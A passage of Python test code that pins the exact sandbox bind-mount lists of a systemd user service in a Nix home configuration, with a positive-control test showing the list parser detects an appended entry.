        actual = _service_list(name)
        assert actual is not None, f"{name} is missing from the unit entirely."
        added = [e for e in actual if e not in ledger]
        removed = [e for e in ledger if e not in actual]
        assert not added, (
            f"{name} gained entr(ies): {added}. Every entry is a path this unit "
            "can reach INSIDE the sandbox — for BindPaths, a path it can WRITE. "
            "Add it to the ledger deliberately, in the same commit, having "
            "measured live what it lets the unit touch.")
        assert not removed, (
            f"{name} LOST entr(ies): {removed}. For BindPaths that is the store "
            "itself; for BindReadOnlyPaths the unit cannot see its own script.")
        assert actual == ledger, (
            f"{name} is {actual}, ledger is {ledger} — same entries, different "
            "order or duplicated; mount order is not cosmetic.")

    # The leading `-` is policy, per list, and the two differ ON PURPOSE.
    assert BIND_PATHS_LEDGER[0].startswith("-"), (
        "the store bind lost its leading `-`: a host that has never run "
        "/analyze-service would fail to start instead of no-opping cleanly.")
    assert not BIND_READ_ONLY_PATHS_LEDGER[0].startswith("-"), (
        "the script bind grew a leading `-`. MEASURED 2026-08-07 with the "
        "source absent: WITH `-` systemd skips the mount silently and you get "
        "`bash: .../commit.sh: No such file or directory`, status=127 — loud, "
        "but naming the wrong thing. WITHOUT it: status=226/NAMESPACE, "
        "'Failed to set up mount namespacing: <path>: No such file or "
        "directory', which names the actual fault.")


def test_the_bind_list_parser_sees_an_appended_entry():
    """🔴 POSITIVE CONTROL for the exact-contents assertion above. The whole
    point is catching a SECOND element, so prove the parser can see one — and
    that it does not confuse a missing directive with an empty list."""
    import types
    fake = types.SimpleNamespace()
    fake.text = (
        "systemd.user.services.analyze-service-index-commit = {\n"
        "    Service = {\n"
        '      BindPaths = [ "-%h/.claude/analyze-service-index" "-%h" ];\n'
        "      BindReadOnlyPaths = [ ];\n"
        "    };\n"
        "  };\n")
    global _home_nix
    original = _home_nix
    try:
        _home_nix = lambda: fake.text  # noqa: E731
        got = _service_list("BindPaths")
        empty = _service_list("BindReadOnlyPaths")
        absent = _service_list("InaccessiblePaths")
    finally:
        _home_nix = original
    assert got == ["-%h/.claude/analyze-service-index", "-%h"], (
        f"the parser cannot see an appended BindPaths entry (got {got}) — "
        "test_the_bind_lists_are_pinned_by_exact_contents is vacuous")
    assert empty == [], "an EMPTY list must read as empty, not as missing"
    assert absent is None, "a MISSING directive must read as None, not as empty"
